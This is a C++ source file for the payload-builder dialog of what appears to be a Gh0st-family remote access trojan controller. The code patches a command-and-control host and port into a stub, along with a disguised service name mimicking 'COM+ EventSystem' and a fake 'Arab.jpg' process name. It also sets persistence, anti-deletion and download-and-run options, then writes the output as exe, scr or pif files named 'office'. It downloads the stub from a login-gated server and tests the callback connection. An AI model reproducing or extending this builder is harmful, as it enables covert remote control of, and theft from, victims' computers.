// Generate.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Generate.h"
#include "Tools.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern char* MyDecode(char *str);

/////////////////////////////////////////////////////////////////////////////
// CGenerate dialog


char patht[MAX_PATH];

CGenerate::CGenerate(CWnd* pParent /*=NULL*/)
	: CDialog(CGenerate::IDD, pParent)
{

	m_Install = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","Install",0);       //д�밲װ����
	
	if(m_Install == 0)
		m_Green = 1;
	else if(m_Install == 1)
		m_Weite = 1;
	else if(m_Install == 2)
		m_Service = 1;

	//{{AFX_DATA_INIT(CGenerate)
	m_Port = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 81);
	m_Group = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Group","��������");  //������Ϣ
	m_Version = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Version","Arab");  //���߰汾
	m_ServiceName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","ServiceName","EventSystem");  //��������
	m_ServiceDisplayName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Description","COM+ EventSystem");  //��������
	m_ServiceDescription = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","DisplayName","�ṩ�¼����Զ����������� COM ���");  //������ʾ
	m_ProcessName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","ProcessName","Arab.jpg");  //��������
	m_FolderName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","FolderName","Arab");  //Ŀ¼����
	m_Mutex = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Mutex","Arab/:CN");  //������ʾ
	m_Buildtime = _T("");
	m_edit_kb = _T("");
	m_kbcheck = FALSE;
	m_Antideletion = FALSE;
	m_Selfdeletion = FALSE;
	//}}AFX_DATA_INIT
}


void CGenerate::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CGenerate)
	DDX_Control(pDX, IDC_TEST_MASTER, m_TestBtn);
	DDX_Control(pDX, IDC_LOG, m_Log);
	DDX_Text(pDX, IDC_HOST, m_Host);
	DDX_Text(pDX, IDC_GROUP, m_Group);
	DDX_Text(pDX, IDC_VERSION, m_Version);
	DDX_Text(pDX, IDC_SERVICE_NAME, m_ServiceName);
	DDX_Text(pDX, IDC_SERVICE_DISPLAY, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_SERVICE_DESCRIP, m_ServiceDescription);
	DDX_Check(pDX, IDC_GREEN, m_Green);   //��ɫ��װ
	DDX_Check(pDX, IDC_WRITE, m_Weite);   //д������
	DDX_Check(pDX, IDC_SERVICE, m_Service);   //��������
	DDX_Text(pDX, IDC_PROCESSNAME, m_ProcessName);
	DDX_Text(pDX, IDC_FOLDERNAME, m_FolderName);
	DDX_Text(pDX, IDC_MUTEX, m_Mutex);
	DDX_Text(pDX, IDC_BUILDTIME, m_Buildtime);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);
	DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
	DDX_Check(pDX, IDC_ANTIDELETION, m_Antideletion);
	DDX_Check(pDX, IDC_SELFDELETION, m_Selfdeletion);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CGenerate, CDialog)
	//{{AFX_MSG_MAP(CGenerate)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_BN_CLICKED(IDC_WRITE, OnWrite)
	ON_BN_CLICKED(IDC_SERVICE, OnService)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbcheck)
	ON_BN_CLICKED(IDC_KBTEST, OnKbtest)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	ON_BN_CLICKED(IDC_BUILD_LOGIN, OnBuildLogin)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGenerate message handlers


int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

HBRUSH CGenerate::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_LOG) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255,255,255);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	
}

void CGenerate::LogOut(LPCSTR OutText)
{
	int length = m_Log.GetWindowTextLength(); 
	m_Log.SetSel(length, length);
	m_Log.ReplaceSel (OutText); 
}

BOOL CGenerate::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	UpdateData(true);
	
	CString IP;		
	char hostname[256]; 
	gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	if (host != NULL)
		IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
	else
		IP = _T("127.0.0.1");
	
	m_Host = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Host", IP);
	
	CTime strTime = CTime::GetCurrentTime();
	m_Buildtime = strTime.Format("%Y-%m-%d");

	LogOut("\r\n\r\n");

	UpdateData(false);

	OnStartup();

	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

ONLINE_DATA online_data = 
{
	"127.0.0.1",
		8090,
		"",//�������
		"",
		0,
		"",
		"",
		"",
		"",
		"",
		'"',
		'"',
		'"',
		0,
		0,
};

BOOL CGenerate::CreateServer(ONLINE_DATA *lpData,LPSTR szPath,char *datPaths)
{
	CopyFile(datPaths,szPath,FALSE);
	
	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle!=INVALID_HANDLE_VALUE)
	{
		DWORD Size = GetFileSize(m_Handle,NULL);
		char * Buffer = new char[Size];
		if(Buffer == NULL)
		{
			CloseHandle(m_Handle);
			return FALSE;
		}
		DWORD YtesRead=0;
		DWORD iCount=0;
		do
		{
			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
			iCount+=YtesRead;
		}while(iCount<Size);
		
		
		
		DWORD SizePoint = MemFindStr(Buffer,"127.0.0.1",Size,0);//
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			WriteFile(m_Handle,lpData,sizeof(ONLINE_DATA),&Written,NULL);
		}
		CloseHandle(m_Handle);
	}
	return TRUE;
}

void CGenerate::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strHost,strPort, strGroup, strGetVersion;
	GetDlgItem(IDC_HOST)->GetWindowText(strHost);

	GetDlgItem(IDC_GROUP)->GetWindowText(strGroup);
	GetDlgItem(IDC_VERSION)->GetWindowText(strGetVersion);
	
	strPort= ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings","ListenPort","8090");  

	if (strHost.IsEmpty() || strPort.IsEmpty())
	{
		AfxMessageBox("��������д���ߵ�ַ���߶˿�");
		return;
	}
	
	if (strGetVersion.IsEmpty())
	{
		AfxMessageBox("������д�汾��Ϣ");
		return;
	}
	
	int int_chage1 = atoi((LPCSTR)strPort);//CString ת��Ϊint
	if (int_chage1 <=1 || int_chage1 >=65535)
	{
		::MessageBox(0,"�˿�1��Χֻ��Ϊ1~65535֮���һ����","��ʾ", MB_ICONINFORMATION);
		return;
	}
	
	if (strGroup.IsEmpty())
	{
		AfxMessageBox("��������д������");
		return;
	}

	ZeroMemory(&online_data,sizeof(ONLINE_DATA));
	online_data.LoginPort =(WORD)m_Port;
	strcpy(online_data.LoginAddr,m_Host.GetBuffer(0));
	strcpy(online_data.Version,m_Version.GetBuffer(0));
	strcpy(online_data.UpGroup,m_Group.GetBuffer(0));
	strcpy(online_data.ServiceName,m_ServiceName.GetBuffer(0));   //��������
	strcpy(online_data.ServicePlay,m_ServiceDisplayName.GetBuffer(0));   //������ʾ
	strcpy(online_data.ServiceDesc,m_ServiceDescription.GetBuffer(0));   //��������
	strcpy(online_data.FolderName,m_FolderName.GetBuffer(0));   //Ŀ¼����
	strcpy(online_data.ProcessName,m_ProcessName.GetBuffer(0));   //��������

	LogOut("\r\n�����������������Ϣ...\r\n");


	//д�밲װ����
	if(m_Green)
		m_Install = 0;
	if(m_Weite)
		m_Install = 1;
	if(m_Service)
		m_Install = 2;
	
	online_data.Install = m_Install;    //��װ����
	strcpy(online_data.Mutex,m_Mutex.GetBuffer(0));       
	strcpy(online_data.Buildtime,m_Buildtime.GetBuffer(0));         
	if (!m_edit_kb.IsEmpty() && m_kbcheck)
	{
		strcpy(online_data.szDownRun,m_edit_kb.GetBuffer(0));
	}
	
	online_data.Antideletion = m_Antideletion;    //��ɾ��
	online_data.Selfdeletion = m_Selfdeletion;   //��ɾ��

	LogOut("\r\n������ϰ�װ��Ϣ...\r\n");
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Host", m_Host);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Group", m_Group);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Version", m_Version);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","Install",m_Install);  //��װ����
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", m_ServiceName);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", m_ServiceDisplayName);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", m_ServiceDescription);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ProcessName",m_ProcessName);  //��װĿ¼
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "FolderName",m_FolderName);  //��װ����
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Mutex", m_Mutex);

	LogOut("\r\n���ڱ���������Ϣ...\r\n");

	TCHAR szSaveFile[MAX_PATH]={0};
	
	char BASED_CODE szFilter[] = "��ִ���ļ�(*.exe)|*.exe|��Ļ��������(*.scr)|*.scr|������(*.bat)|*.bat|COM(*.com)|*.com|PIF(*.pif)|*.pif||";  
	CFileDialog fdlg(FALSE, "exe", "office", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, szFilter ); 
	if(fdlg.DoModal() == IDOK)
	{
		strcpy(szSaveFile, fdlg.GetPathName());
	}
	else
	{
			LogOut("\r\n�û�ȡ������...\r\n");
			return ;
	}
	
	
 	GetModuleFileName(NULL, patht,MAX_PATH);   //��ȡ������������·������,��Gh0st.exe��·��
 	PathRemoveFileSpec(patht);//ȥ���ļ����е�gh0st
 	char Datpath[MAX_PATH];
	sprintf(Datpath,"%s\\Cache\\install.dat",patht);
// 	strcpy(Datpath,"C:\\WINDOWS\\WIN32.cc");
	
	//���dat�ļ��Ƿ����
	if (IsFileExist(Datpath)==FALSE)
	{
		LogOut("\r\n�����ļ� EXE.dat ������...\r\n");
		return;
	}
	
	if (CreateServer(&online_data,szSaveFile,Datpath)==FALSE)
	{
		MessageBox("���������ʧ��!");
		return;
	}


	CFile file;
	file.Open(szSaveFile, CFile::modeRead);
	float fFileLength=(float)file.GetLength();
	CString strMess;
	strMess.Format("�ļ���С: %0.0f KB ",fFileLength/1024);
	LogOut("\r\n" + strMess + "\r\n");
	file.Close();
	
	
	CString szTempTips;
	szTempTips.Format("������:%s",szSaveFile);
	LogOut("\r\n" + szTempTips + "\r\n");
}

BOOL CGenerate::IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}


void CGenerate::OnStartup()
{
	
	BOOL Green,Service;
	
	UpdateData(true);
	
	if(m_Green == TRUE)//��ɫ
		Green = NULL;
	else
		Green = TRUE;
	
	if(m_Service != TRUE)//����
		Service = NULL;
	else
		Service = TRUE;
	
	GetDlgItem(IDC_SERVICE_DISPLAY)->EnableWindow(Service);
	GetDlgItem(IDC_SERVICE_DESCRIP)->EnableWindow(Service);
	
}

void CGenerate::OnGreen() 
{
	// TODO: Add your control notification handler code here
	OnStartup();
}

void CGenerate::OnWrite() 
{
	// TODO: Add your control notification handler code here
	OnStartup();
}

void CGenerate::OnService() 
{
	// TODO: Add your control notification handler code here
	OnStartup();
}

void CGenerate::OnKbcheck() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (m_kbcheck)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}


bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return TRUE;
	
}

void CGenerate::OnKbtest() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int	nUrlLength;
	char	*lpURL = NULL;
	char szFile[512] = {0};
	char	*lpFileName = NULL;
	nUrlLength = m_edit_kb.GetLength();
	if (nUrlLength == 0)
	{
		AfxMessageBox("����Ϊ��");
		return ;
	}
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, m_edit_kb.GetBuffer(0), nUrlLength + 1);
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
	{
		AfxMessageBox("�޷���ȡ�ļ���");
		return;
	}
	
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
		{
			AfxMessageBox("�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ�����ļ�������");
			return ; 
		}
	}else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
	{
		AfxMessageBox("URL ����ȷ���ļ�����ʧ��	");
		return ;    //URL ����ȷ���ļ�����ʧ��	
	}else
	{
		AfxMessageBox("�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ	");
		return ; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
	}
    OpenFile(szFile,SW_SHOW);
}

void CGenerate::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
	if (!m_Host.GetLength() || !m_Port)
	{
		MessageBox("��������д������Ϣ...","��ʾ...", MB_ICONSTOP);
		return;
	}
	
	m_TestBtn.EnableWindow(FALSE);
	TestMaster();
}

void CGenerate::TestMaster() 
{
	// TODO: Add your control notification handler code here
	
	CString	strResult;
	CString	strResulr = "����ʧ��... ";
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		MessageBox("���ߵ�ַ-��ʼ��ʧ��... ","��ʾ...", MB_ICONSTOP);
		return ;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(m_Host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(m_Port);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
	
fail:
	
	HOSTENT* hst=NULL;
	CString strname,strip,tmp;
	GetDlgItem(IDC_HOST)->GetWindowText(strname);
	struct in_addr ia;
	hst=gethostbyname((LPCTSTR)strname);
	
    for(int i=0;hst->h_addr_list[i];i++){
        memcpy(&ia.s_addr,hst->h_addr_list[i],sizeof(ia.s_addr));
        tmp.Format("%s\n",inet_ntoa(ia));
		strip+=tmp;
    }
	
	
	strResult.Format("��ȷ������������Ϣ\n  \n����������%s  \n���ߵ�ַ��%s  \n���Ӷ˿�: %d ",m_Host,strip,m_Port);
	if (bRet)
	{
		strResulr = "���ӳɹ�... ";
		
		MessageBox(strResult,strResulr,MB_ICONINFORMATION);
	}
    else
	{
		MessageBox(strResult,strResulr,MB_ICONSTOP);
	}
	m_TestBtn.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������
	
	return ;
	
}

static WORD RandMoniCount=0;

CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CClientApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}

void CGenerate::OnRandom() 
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);
	RandMoniCount++;
	
	for (int i=0;i<19;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (int i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (int i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}
	
	SetDlgItemText(IDC_SERVICE_NAME,ServerName);
	SetDlgItemText(IDC_SERVICE_DISPLAY,ServerShow);
	SetDlgItemText(IDC_SERVICE_DESCRIP,ServerDesc);
}

CString SHANGXIANXINXI;
/////////������Ϣ��ȡ////////////
#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11

typedef struct
{
	
	BYTE	Flags;
	DWORD	Buffer_Size;
	BYTE	Buffer[1024];
	BYTE	Info[256];//���ߵ�ַ
}NET_DATA, *LPNET_DATA;

void CGenerate::OnBuildLogin() 
{
	// TODO: Add your control notification handler code here
	DeleteFile("C:\\WINDOWS\\WIN32.cc");

	char UserName[50];
	char UserPass[50];
	GetDlgItemText(IDC_BUILD_USERNAME,UserName,sizeof(UserName));
	GetDlgItemText(IDC_BUILD_USERPASS,UserPass,sizeof(UserPass));
	if (strcmp(UserName,"")==0||strcmp(UserPass,"")==0)
	{
		MessageBox("����дVip�˺�\\Vip����","����",NULL);
	    return;
	}
	char TmpPath[MAX_PATH];
	GetTempPath( sizeof(TmpPath), TmpPath );
	lstrcatA( TmpPath, "\\WindsTemp.exe" );
	DeleteFile(TmpPath);
	DWORD recvsize = 0;
	SOCKET sockInt;
	struct sockaddr_in serverAddr;
	//struct hostent *hp;
	WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
	//����SOCK
	sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		WSACleanup();
		return;
	}
	
	//��ȡ������IP�Ͷ˿�
	serverAddr.sin_family = AF_INET;
	char tgtIP[30] = {0};
	struct hostent *hp = NULL;	

	CString MyHostName = m_IniFile.GetString( "HostName", "HostName", "" );
	char hostname[50];
	if ( MyHostName.GetLength() != 0 )
	{ 
		strcpy( hostname,MyDecode((char *)MyHostName.GetBuffer(0)));
	}

	if ((hp = gethostbyname(hostname)) != NULL)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpy(tgtIP,inet_ntoa(in));
	}
	
	serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
	serverAddr.sin_port = htons(1110);
	
	//���ӷ���
	if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		AfxMessageBox("���ӷ�����ʧ��!\n");
		WSACleanup();
		return;
	}

	char USERIMFOR[256] = {0}, buff[256] = {0};
	wsprintf( USERIMFOR, "Login:%s@%s",UserName,UserPass);
	
	if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
	{
		AfxMessageBox("��������ʧ��!\n");
		WSACleanup();
		return;
	}
	
	int Ret = recv( sockInt, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
		AfxMessageBox("��¼ʧ��!���ܵ��µ�ԭ��1.�������ɴ����������Ѿ�����  2.��ɾ���˵�½��INI�ļ��������޷���ȡ�û���������  3.�볢�����´򿪱�������������������ѯ�ͷ�");
		WSACleanup();
		return;
	}
	if ( strstr( buff, "Pass" ) != NULL )//ͨ����֤
	{	
		if ( GetFileAttributes(TmpPath) != -1 )
		{
			WSACleanup();
			return;
		}
		
		NET_DATA MyData;
		DWORD dwBytes;
		HANDLE hFile = CreateFile( TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		request[0] = Request_DOWN;
		char *laji = "48f9648";
		
		if ( UserPass != 0 )
		{
			lstrcpy( (char*)&request[1],UserPass );
		}
		send( sockInt, (char*)&request, sizeof(request), NULL );
		while (1)
		{
			memset( &MyData, 0, sizeof(NET_DATA) );
			Ret = recv( sockInt, (char*)&MyData, sizeof(MyData), NULL );
			if ( Ret == 0 || Ret == SOCKET_ERROR )
			{
				AfxMessageBox("��ȡ�ļ�����!");
				CloseHandle(hFile);
				WSACleanup();
				return;
			}
			if ( MyData.Flags != File_Buffer_Finish && MyData.Flags != File_Buffer ) break;
			SHANGXIANXINXI = MyData.Info;

/*
				BOOL WriteFile(
				HANDLE  hFile,//�ļ����
				LPCVOID lpBuffer,//���ݻ�����ָ��
				DWORD   nNumberOfBytesToWrite,//��Ҫд���ֽ���
				LPDWORD lpNumberOfBytesWritten,//���ڱ���ʵ��д���ֽ����Ĵ洢�����ָ��
				LPOVERLAPPED lpOverlapped//OVERLAPPED�ṹ��ָ��
);*/

			WriteFile(hFile, MyData.Buffer, MyData.Buffer_Size, &dwBytes, NULL);
			recvsize += MyData.Buffer_Size;
			send( sockInt, laji, lstrlen(laji) + 1, NULL );
			if ( MyData.Flags == File_Buffer_Finish ) break;
		}
		CloseHandle(hFile);
	}
	else
	{
		WSACleanup();
		return;
	}
	//�ر�SOCK
	closesocket(sockInt);
	WSACleanup();
	MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");

	SetDlgItemText(IDC_HOST,SHANGXIANXINXI);
	GetDlgItem(IDC_BUILD)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUILD_LOGIN)->EnableWindow(FALSE);
}
